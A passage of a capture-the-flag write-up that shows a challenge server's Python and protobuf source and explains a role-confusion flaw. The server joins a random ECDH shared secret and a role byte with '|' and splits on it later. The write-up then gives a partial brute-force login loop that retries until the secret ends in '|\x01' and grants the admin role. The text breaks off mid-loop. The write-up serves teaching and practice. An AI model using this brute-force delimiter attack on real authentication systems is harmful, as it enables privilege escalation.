    parser.add_argument(&amp;#39;-r&amp;#39;, &amp;#39;--remote&amp;#39;, help=&amp;#34;The address:port of the remote server hosting the challenge&amp;#34;, required=True)
    args = parser.parse_args()

    if args.remote != None:
        host = args.remote.split(&amp;#34;:&amp;#34;)[0]
        port = int(args.remote.split(&amp;#34;:&amp;#34;)[1])
    else:
        exit(0)

    s = remote(host, port)

    ## Create new user
    log.info(&amp;#34;Creating new user&amp;#34;)
    e = create_user()

    ## Register
    log.info(&amp;#34;Registering new user&amp;#34;)
    uid = register(s,e)

    ## Login
    log.info(&amp;#34;Logging in - part 1&amp;#34;)
    (sessionId, chal, sepk) = login(s, uid)
    log.info(&amp;#34;Logging in - part 2&amp;#34;)
    ceph = login2(s, e, sessionId, chal)

    ## Request message
    log.info(&amp;#34;Requesting message&amp;#34;)
    msg = request_msg(s, sessionId, uid, ceph, sepk)
    log.info(&amp;#34;message received: {}&amp;#34;.format(msg))


    s.close()
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;





  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;629781354&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;629781354&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;server.py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
#!/usr/bin/python3

# protoc -I=. --python_out=. ./server.proto
# socat -d TCP-LISTEN:2323,reuseaddr,fork EXEC:&amp;#34;python3 server_stdio_3.py&amp;#34;

from google.protobuf.internal.encoder import _VarintEncoder
from google.protobuf.internal.decoder import _DecodeVarint
import server_pb2 as spb
from google.protobuf.internal.decoder import _DecodeError

import Crypto.Cipher.AES as AES
import Crypto.Hash.SHA512 as SHA512
from Crypto.Protocol.KDF import HKDF
from Crypto.Util.number import long_to_bytes, bytes_to_long

from ecdsa import ECDH, NIST256p, VerifyingKey
import uuid

import logging
import os
import sys

from cybears import flag

#logging.root.setLevel(logging.DEBUG)
#logging.root.setLevel(logging.INFO)
logging.root.setLevel(logging.ERROR)

logger = logging.getLogger(&amp;#34;__name__&amp;#34;)

h1 = logging.StreamHandler(sys.stderr)
h1.setLevel(logging.DEBUG)
h2 = logging.StreamHandler(sys.stderr)
h2.setLevel(logging.INFO)

logger.addHandler(h1)
logger.addHandler(h2)


def send_message(msg):
    &amp;#34;&amp;#34;&amp;#34; Send a message, prefixed with its size, to stdout &amp;#34;&amp;#34;&amp;#34;
    data = msg.SerializeToString()
    mh = spb.MessageHeader()
    mh.msglen = len(data)
    mh.type = msg.type
    sys.stdout.buffer.write(mh.SerializeToString() &amp;#43; data)
    sys.stdout.flush()
    logging.info(&amp;#34;Sent msg over stdout...&amp;#34;)
    return 

def msg_type(msgtype):
    if msgtype == spb.MSG_LOGIN_REQUEST:
        return spb.LoginRequest()
    elif msgtype == spb.MSG_LOGIN_RESPONSE:
        return spb.LoginResponse()
    elif msgtype == spb.MSG_LOGIN_CHALLENGE:
        return spb.LoginChallenge()
    elif msgtype == spb.MSG_LOGIN_CHALLENGE_RESPONSE:
        return spb.LoginChallengeResponse()
    elif msgtype == spb.MSG_REGISTER_REQUEST:
        return spb.RegisterRequest()
    elif msgtype == spb.MSG_REGISTER_RESPONSE:
        return spb.RegisterResponse()
    elif msgtype == spb.MSG_MESSAGE_REQUEST:
        return spb.MessageRequest()
    elif msgtype == spb.MSG_MESSAGE_RESPONSE:
        return spb.MessageResponse()
    else:
        return None   

def check_fields(msg):
    result = True
    for field in msg.DESCRIPTOR.fields_by_name.keys():
        if msg.DESCRIPTOR.fields_by_name[field].label == msg.DESCRIPTOR.fields_by_name[field].LABEL_REQUIRED:
            result &amp;amp;= msg.HasField(field)
    return result

def recv_message():
    &amp;#34;&amp;#34;&amp;#34; Receive a message, prefixed with its size and type, from stdin &amp;#34;&amp;#34;&amp;#34;
    # Receive the size of the message data
    # expect [MessageHeader][Message of type]
    data = b&amp;#39;&amp;#39;
    header = spb.MessageHeader()
    while True:
        data&amp;#43;= sys.stdin.buffer.read(1)
        try: 
            header.ParseFromString(data)
            if check_fields(header):
                break
        except _DecodeError as e: 
            pass
    logging.debug(&amp;#34;header {}&amp;#34;.format(header))

    # Receive the message data
    data = sys.stdin.buffer.read(header.msglen)
    logging.debug(&amp;#34;received [{}]&amp;#34;.format(data))

    # Decode the message and validate all required fields are present
    msg = msg_type(header.type)
    if msg != None: 
        try:
            msg.ParseFromString(data)
            if not check_fields(msg):
                return None
            logging.debug(&amp;#34;msg {}&amp;#34;.format(msg))
            return msg
        except _DecodeError:
            return None
    else:
        return None

def handle_register_request(msg):
    logging.debug(&amp;#34;Got register request&amp;#34;)
    # validate request
    # check public key is on correct curve
    try:
        v = VerifyingKey.from_string(msg.clientPublicKey, NIST256p)
    except Exception as e:
        resp = spb.RegisterResponse()
        resp.type = spb.MSG_REGISTER_RESPONSE
        resp.uid = 0xff
        resp.status = spb.FAILURE
        send_message(resp) 
        logging.info(&amp;#34;FAILURE: User failed to registered with invalid pub key: {} and error {}&amp;#34;.format(msg.clientPublicKey,e))
        return spb.FAILURE

    # parse request
    uid = register_user(USERS, msg.name, msg.clientPublicKey)

    # send response
    resp = spb.RegisterResponse()
    resp.type = spb.MSG_REGISTER_RESPONSE
    resp.uid = uid
    resp.status = spb.SUCCESS
    send_message(resp) 
    logging.info(&amp;#34;SUCCESS: User registered with uid: {}&amp;#34;.format(uid))

    return spb.SUCCESS

def handle_login_request(SESSION, msg):
    logging.debug(&amp;#34;Got Login request&amp;#34;)
    resp = spb.LoginResponse()
    resp.type = spb.MSG_LOGIN_RESPONSE

    # validate request
    if msg.uid &amp;gt; len(USERS) or msg.uid == 0: 
        logging.info(&amp;#34;ERROR: invalid uid&amp;#34;)
        resp.status = spb.FAILURE
        resp.sessionId = b&amp;#39;&amp;#39;
        resp.challenge = b&amp;#39;&amp;#39;
        resp.ephemeralServerPublicKey = b&amp;#39;&amp;#39;
        send_message(resp)
        return spb.FAILURE

    requested_user = USERS[msg.uid - 1]

    # parse request
    
    # send response
    challenge = os.urandom(32) # random 32-byte challenge to sign    
    server_ephemeral_ecdh = ECDH(curve=NIST256p)
    server_ephemeral_ecdh.generate_private_key()
    server_ephemeral_public_key = server_ephemeral_ecdh.get_public_key()
    
    sessionId = str(uuid.uuid4()).encode()

    resp.status = spb.SUCCESS
    resp.sessionId = sessionId
    resp.challenge = challenge
    resp.ephemeralServerPublicKey = server_ephemeral_public_key.to_string(encoding=&amp;#39;compressed&amp;#39;)

    SESSIONS[sessionId] = {&amp;#39;completed_challenge&amp;#39;:False, &amp;#39;challenge&amp;#39;:challenge, &amp;#39;ephemeral_ecdh&amp;#39;:server_ephemeral_ecdh, &amp;#39;uid&amp;#39;:msg.uid}
    logging.debug(&amp;#34;New session created {}&amp;#34;.format(SESSIONS[sessionId]))
    logging.info(&amp;#34;SUCCESS: User correctly requested login with uid: {}&amp;#34;.format(msg.uid))
    send_message(resp)

    return spb.SUCCESS

def verify_challenge(chal, chalResponse, public_key):

    try:
        public_key.verify(chalResponse, data=chal)
    except ecdsa.BadSignatureError:
        return False

    return True

def handle_login_challenge_request(SESSION, USERS, msg):
    logging.debug(&amp;#34;Got Login Challenge request&amp;#34;)
    resp = spb.LoginChallengeResponse()
    resp.type = spb.MSG_LOGIN_CHALLENGE_RESPONSE
        
    # validate request
        # sessionId in SESSIONS?
    if msg.sessionId not in SESSIONS:
        resp.status = spb.FAILURE
        resp.sessionId = b&amp;#39;&amp;#39;
        logging.info(&amp;#34;FAILURE: User send invalid sessionId: {}&amp;#34;.format(msg.sessionId))
        send_message(resp)
        return spb.FAILURE

    uid = SESSIONS[msg.sessionId][&amp;#39;uid&amp;#39;]
    requested_user = USERS[uid - 1]
    logging.debug(&amp;#34;requested user {}: {}&amp;#34;.format(uid,requested_user))
    clientPubKey = VerifyingKey.from_string(requested_user[&amp;#39;pubkey&amp;#39;], NIST256p) #already validated 
    clientRole = requested_user[&amp;#39;role&amp;#39;]

    sessionId = msg.sessionId
        # verify challenge
    if not verify_challenge(SESSION[sessionId][&amp;#39;challenge&amp;#39;], msg.challengeResponse, clientPubKey):
        resp.status = spb.FAILURE
        resp.sessionId = b&amp;#39;&amp;#39;
        logging.info(&amp;#34;FAILURE: User failed challenge: {}&amp;#34;.format(msg.challenge))
        send_message(resp)
        return spb.FAILURE

        # ensure ephem client key is on curve
    try:
        clientEphemPubKey = VerifyingKey.from_string(msg.ephemeralClientPublicKey, NIST256p)
    except Exception as e:
        resp.status = spb.FAILURE
        resp.sessionId = b&amp;#39;&amp;#39;
        logging.info(&amp;#34;FAILURE: Invalid client ephemeral public key: {}&amp;#34;.format(msg.ephemeralClientPublicKey))
        send_message(resp)
        return spb.FAILURE

    # action request
    server_ephemeral_ecdh = SESSIONS[sessionId][&amp;#39;ephemeral_ecdh&amp;#39;]
    server_ephemeral_ecdh.load_received_public_key(clientEphemPubKey)
    shared_secret = server_ephemeral_ecdh.generate_sharedsecret_bytes()

    token  = shared_secret 
    token &amp;#43;= b&amp;#39;|&amp;#39; &amp;#43; long_to_bytes(clientRole) 
    token &amp;#43;= b&amp;#39;|&amp;#39; &amp;#43; long_to_bytes(uid) 
    token &amp;#43;= b&amp;#39;|&amp;#39; &amp;#43; sessionId

    # send response
    resp.status = spb.SUCCESS
    resp.sessionId = sessionId

    SESSIONS[sessionId][&amp;#39;completed_challenge&amp;#39;] = True
    SESSIONS[sessionId].update( {&amp;#39;client_token&amp;#39;:token} )
    logging.info(&amp;#34;SUCCESS: User correctly completed challenge with uid: {}&amp;#34;.format(uid))
    send_message(resp)

    return spb.SUCCESS

def handle_message_request(SESSIONS, msg):
    logging.debug(&amp;#34;Got message request&amp;#34;)
    resp = spb.MessageResponse()
    resp.type = spb.MSG_MESSAGE_RESPONSE
    # validate request
    if msg.sessionId not in SESSIONS:
        resp.status = spb.FAILURE
        resp.encMsg = b&amp;#39;&amp;#39;
        resp.encMsgTag = b&amp;#39;&amp;#39;
        logging.info(&amp;#34;ERROR: Invalid sessionId: {}&amp;#34;.format(sessionId)) 
        send_message(resp)
        return spb.FAILURE

    # parse request
    if SESSIONS[msg.sessionId][&amp;#39;completed_challenge&amp;#39;] == False or &amp;#39;client_token&amp;#39; not in SESSIONS[msg.sessionId]:
        resp.status = spb.FAILURE
        resp.encMsg = b&amp;#39;&amp;#39;
        resp.encMsgTag = b&amp;#39;&amp;#39;
        logging.info(&amp;#34;ERROR: challenge not completed for this session&amp;#34;)
        send_message(resp)
        return spb.FAILURE

    token = SESSIONS[msg.sessionId][&amp;#39;client_token&amp;#39;]
    role = bytes_to_long(token.split(b&amp;#39;|&amp;#39;)[1])
    
    (aes_gcm_key, nonce) = HKDF(token, 16, &amp;#39;&amp;#39;, SHA512, num_keys=2) 

    if role == spb.ADMIN:
        plain = b&amp;#39;Congratulations - here is your flag: &amp;#39; &amp;#43; flag
    else:
        plain = b&amp;#39;Welcome USER!&amp;#39;

    a = AES.new(aes_gcm_key, AES.MODE_GCM, nonce = nonce)
    (cipher, tag) = a.encrypt_and_digest(plain)

    # send response    

    resp.status = spb.SUCCESS
    resp.encMsg = cipher
    resp.encMsgTag = tag
    logging.info(&amp;#34;SUCCESS: message sent&amp;#34;) 
    send_message(resp)

    return spb.SUCCESS

def register_user(USERS, name, pubkey, role = spb.USER):
    len_db = len(USERS)
    uid = len_db &amp;#43; 1
    USERS.append( {&amp;#34;name&amp;#34;: name, &amp;#34;pubkey&amp;#34;: pubkey, &amp;#34;uid&amp;#34;:uid, &amp;#34;role&amp;#34;: role} )
    logging.debug(&amp;#34;users = {}&amp;#34;.format(USERS))
    return uid

if __name__ == &amp;#34;__main__&amp;#34;:
    
    logging.debug(&amp;#34;creating sessions database&amp;#34;)
    # create session database
    SESSIONS = {}

    logging.debug(&amp;#34;creating admin user&amp;#34;)
    # create admin user
    server_ecdh = ECDH(curve=NIST256p)
    server_ecdh.generate_private_key()
    server_public_key = server_ecdh.get_public_key()
    spub = server_public_key.to_string(encoding=&amp;#39;compressed&amp;#39;)
    
    logging.debug(&amp;#34;creating user database&amp;#34;)
    # create user database
    USERS = []
    register_user(USERS, b&amp;#34;admin&amp;#34;, spub, role = spb.ADMIN)  


    logging.debug(&amp;#34;starting message loop&amp;#34;)
    while True:
       m  = recv_message()
       if m != None:
           if m.type == spb.MSG_REGISTER_REQUEST:
               handle_register_request(m)
               continue
           elif m.type == spb.MSG_LOGIN_REQUEST:
               ret = handle_login_request(SESSIONS, m)
               continue
           elif m.type == spb.MSG_LOGIN_CHALLENGE:
               ret = handle_login_challenge_request(SESSIONS, USERS, m)
               continue
           elif m.type == spb.MSG_MESSAGE_REQUEST:
               handle_message_request(SESSIONS, m)
               continue
           else:
               logging.error(&amp;#34;Unknown message type, exitting...&amp;#34;)
               exit(0)

&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;





  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;972384156&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;972384156&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;proto&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;server.proto&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-proto&#34; &gt;&lt;code&gt;
syntax = &amp;#34;proto2&amp;#34;;

package server;

enum MessageType {
	MSG_LOGIN_REQUEST=0;
	MSG_LOGIN_RESPONSE=1;
	MSG_LOGIN_CHALLENGE=2;
	MSG_LOGIN_CHALLENGE_RESPONSE=3;
	MSG_REGISTER_REQUEST=4;
	MSG_REGISTER_RESPONSE=5;
	MSG_MESSAGE_REQUEST=6;
	MSG_MESSAGE_RESPONSE=7;
}

enum Status {
		SUCCESS = 0;
		FAILURE = 1;
	}

enum Role {
		USER = 0;
		ADMIN = 1;
	}

message MessageHeader {
	required uint32 msglen = 1;
	required MessageType type = 2;
}

message RegisterRequest {
	required MessageType type = 1;
	required bytes name = 2;
	required bytes clientPublicKey = 3;
}

message RegisterResponse {
	required MessageType type = 1;
	required uint32 uid = 2;
	required Status status = 3;
}

message LoginRequest {
	required MessageType type = 1;
	required uint32 uid = 2;
}

message LoginResponse {
	required MessageType type = 1;
	required bytes sessionId = 2;
	required bytes challenge = 3;
	required bytes ephemeralServerPublicKey = 4;
	required Status status = 5;
}

message LoginChallenge {
	required MessageType type = 1;
	required bytes sessionId = 2;
	required bytes challengeResponse = 3;
	required bytes ephemeralClientPublicKey = 4;
}

message LoginChallengeResponse {
	required MessageType type = 1;
	required bytes sessionId = 2;
	required Status status = 3; 
}
	
message MessageRequest {
	required MessageType type = 1;
	required bytes sessionId = 3;
}

message MessageResponse {
	required MessageType type = 1;
	required Status status = 2;
	required bytes encMsg = 3;
	required bytes encMsgTag = 4;
}

&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;We also need to run the command in the server file &lt;code&gt;protoc -I=. --python_out=. ./server.proto&lt;/code&gt;, to generate &lt;code&gt;server_pb2.py&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;There&amp;rsquo;s a lot of code to go through, but I&amp;rsquo;ll try to explain the relevant parts:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The server handles registering new users and logging in.&lt;/li&gt;
&lt;li&gt;To register, the client provides a public key, which must be on the NIST256p curve, then the public key is stored alongside their user id (&lt;code&gt;uid&lt;/code&gt;), name and role.&lt;/li&gt;
&lt;li&gt;To login, there are two steps.
&lt;ul&gt;
&lt;li&gt;Firstly, the server generates a random challenge and public key, and sends it to us.&lt;/li&gt;
&lt;li&gt;Then we must sign the challenge with our public key and send the signature to the server, which checks if the signature is valid. If so, the server calculates the shared secret with its private key and our public key. The server then stores our info (shared secret, role, uid, session id) in a &lt;code&gt;token&lt;/code&gt;, and sends us our session id.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;We can also request a message, providing a session id. The server retrieves the token corresponding to our session, and checks if we have the admin role. If we do, we get the flag.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I don&amp;rsquo;t think there&amp;rsquo;s anything wrong with the procedures described above, but I noticed our info was being stored in the token in a very bad way:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;handle_login_challenge_request&lt;/span&gt;(SESSION, USERS, msg):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    token  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; shared_secret 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    token &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;|&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; long_to_bytes(clientRole) 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    token &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;|&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; long_to_bytes(uid) 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    token &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;|&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; sessionId
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The server then uses &lt;code&gt;|&lt;/code&gt; as a delimeter to seperate our info later on:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;handle_message_request&lt;/span&gt;(SESSIONS, msg):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    token &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; SESSIONS[msg&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sessionId][&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;client_token&amp;#39;&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    role &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bytes_to_long(token&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;|&amp;#39;&lt;/span&gt;)[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;])
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; role &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; spb&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ADMIN:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        plain &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Congratulations - here is your flag: &amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; flag
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        plain &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Welcome USER!&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;bytes_to_long(token.split(b&#39;|&#39;)[1])&lt;/code&gt; retrieves the role by splitting with &lt;code&gt;|&lt;/code&gt; and getting the second element. This means if we can inject a &lt;code&gt;|&lt;/code&gt; character into the token somehow, we could trick it into thinking we have the admin role. However, it seems like we can&amp;rsquo;t control any info in the token, which are &lt;code&gt;shared_secret&lt;/code&gt;, &lt;code&gt;clientRole&lt;/code&gt;, &lt;code&gt;uid&lt;/code&gt; and &lt;code&gt;sessionId&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;But it turns out, the admin role &lt;code&gt;spb.ADMIN&lt;/code&gt; is actually just the number &lt;code&gt;1&lt;/code&gt;, and since &lt;code&gt;shared_secret&lt;/code&gt; is essentially random bytes, there is a chance that it could contain the &lt;code&gt;|&lt;/code&gt; character.&lt;/p&gt;
&lt;p&gt;This is what &lt;code&gt;token&lt;/code&gt; usually looks like:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;shared_secret   |role| uid| session id
...\xc3\x87\xf0|\x00|\x02|c8e9fd09-0cb1-4d6c-88d3-53596a98fccb
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;But what if &lt;code&gt;shared_secret&lt;/code&gt; happened to end with &lt;code&gt;|\x01&lt;/code&gt;?&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;shared_secret   |role| uid| session id
...\xc3\x87|\x01|\x00|\x02|c8e9fd09-0cb1-4d6c-88d3-53596a98fccb
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now the second element when splitting by &lt;code&gt;|&lt;/code&gt; is &lt;code&gt;\x01&lt;/code&gt;, the admin role!&lt;/p&gt;
&lt;p&gt;Since &lt;code&gt;shared_secret&lt;/code&gt; is basically random bytes, there is a 1 in $256^2$ which is 1 in 65536 chance that it ends with &lt;code&gt;|\x01&lt;/code&gt; in which the server thinks we&amp;rsquo;re admin, giving us the flag. This actually meant if you ran the client script, unmodified, enough times, you would get the flag. So I did pretty much that, with slight optimizations.&lt;/p&gt;
&lt;p&gt;65536 is not a lot, but probably not a good idea connecting to the server that many times. Luckily, we can create users and login multiple times over the same connection, so we didn&amp;rsquo;t have to open many connections.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(host, port)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    e &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; create_user()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    uid &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; register(s,e)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; tqdm(range(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt;)):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        (sessionId, chal, sepk) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; login(s, uid)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        ceph &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; login2(s, e, sessionId, chal)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# calculate shared secret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        server_ephemeral_public_key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; VerifyingKey&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;from_string(sepk, NIST256p)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        ceph&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;load_received_public_key(server_ephemeral_public_key)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        shared_secret &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ceph&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;generate_sharedsecret_bytes()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# if shared secret ends with |\x01 , request for the flag&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# (we aren&amp;#39;t explicitly checking for |\x01 because there is a chance&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# it could end with |\x00\x01 etc., which is still valid, slightly increasing&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# our chances)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        token  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; shared_secret
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        token &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;|&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; long_to_bytes(spb&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;USER)
